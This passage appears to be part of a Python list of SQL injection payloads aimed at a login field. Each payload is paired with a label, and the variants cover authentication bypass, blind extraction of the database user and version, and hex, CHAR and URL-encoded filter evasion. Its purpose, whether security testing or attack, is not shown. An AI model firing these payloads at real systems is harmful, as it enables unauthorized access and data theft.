        ("admin' OR 1=1 AND '1'='1'-- ", "Multiple true conditions"),
        ("admin' OR (1=1 AND 2=2)-- ", "Parentheses grouping"),
        ("admin' OR 1=1 OR 1=2-- ", "Multiple OR conditions"),
        
        # Substring/Length based (for extracting usernames)
        ("admin' OR SUBSTR(user(),1,1)='r'-- ", "SUBSTR check (extracts username)"),
        ("admin' OR SUBSTRING(user(),1,1)='r'-- ", "SUBSTRING check"),
        ("admin' OR MID(user(),1,1)='r'-- ", "MID function check"),
        ("admin' OR LEFT(user(),1)='r'-- ", "LEFT function check"),
        ("admin' OR RIGHT(user(),1)='t'-- ", "RIGHT function check"),
        ("admin' OR LENGTH(user())>0-- ", "LENGTH check"),
        ("admin' OR LENGTH(database())>0-- ", "Database length check"),
        
        # Conditional extraction
        ("admin' OR IF(1=1,1,0)-- ", "IF statement for conditional logic"),
        ("admin' OR IF(SUBSTR(@@version,1,1)='5',1,0)-- ", "Version extraction"),
        ("admin' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- ", "CASE statement"),
        
        # Hex encoding
        ("admin' OR 0x31=0x31-- ", "Hex encoded values"),
        ("admin' OR UNHEX('31')=UNHEX('31')-- ", "UNHEX function"),
        
        # CHAR() concatenation
        ("admin' OR CHAR(49)=CHAR(49)-- ", "CHAR function"),
        ("admin' OR 'a'=CHAR(97)-- ", "CHAR string comparison"),
        
        # Alternative operators
        ("admin' || 1=1-- ", "Double pipe OR operator"),
        ("admin' OR 1 LIKE 1-- ", "LIKE operator"),
        ("admin' OR 1 IN (1)-- ", "IN operator"),
        ("admin' OR 1 BETWEEN 0 AND 2-- ", "BETWEEN operator"),
        
        # Complex structures
        ("admin') OR 1=1-- ", "Closing parenthesis"),
        ("admin') OR (1=1)-- ", "Parentheses wrapped"),
        ("admin')) OR 1=1-- ", "Double closing parenthesis"),
        
        # Encoded versions
        ("admin' OR %31=%31-- ", "URL encoded digits"),
        ("admin' OR %20%31%20=%20%31-- ", "URL encoded with spaces"),
        ("admin' OR%20(1)=%20(1)-- ", "URL encoded spaces around parentheses"),
        
